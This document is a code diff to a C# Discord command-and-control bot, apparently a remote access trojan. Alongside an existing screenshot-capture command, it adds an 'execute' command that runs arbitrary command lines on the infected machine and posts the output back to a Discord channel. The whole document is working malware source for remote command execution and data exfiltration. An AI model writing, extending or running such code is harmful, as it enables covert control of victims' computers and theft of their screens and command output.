@@ -31,5 +31,30 @@ public class DiscordC2Commands : ModuleBase<ShardedCommandContext>
     {
         await Context.Message.Channel.SendFileAsync(Utils.GetScreenshot(), "screenshot.png");
     }
+
+    [Command("execute", RunMode = RunMode.Async)]
+    public async Task Execute(string command)
+    {
+        string output = Utils.ExecuteCommandline(command);
+
+        if (output == null)
+        {
+            await Context.Channel.SendMessageAsync("error");
+            return;
+        }
+
+        if (output.Length > 2000-8) {
+            IEnumerable<string> chunks = Utils.CommandOutputWrapper(output);
+            foreach (string chunk in chunks)
+            {
+                await Context.Channel.SendMessageAsync(chunk);
+            }
+            await Context.Channel.SendMessageAsync("error");
+        } else {
+            await Context.Channel.SendMessageAsync($"```\n{output}\n```");
+        }
+        // Console.WriteLine($"{command}");
+        
+    }
 }
 
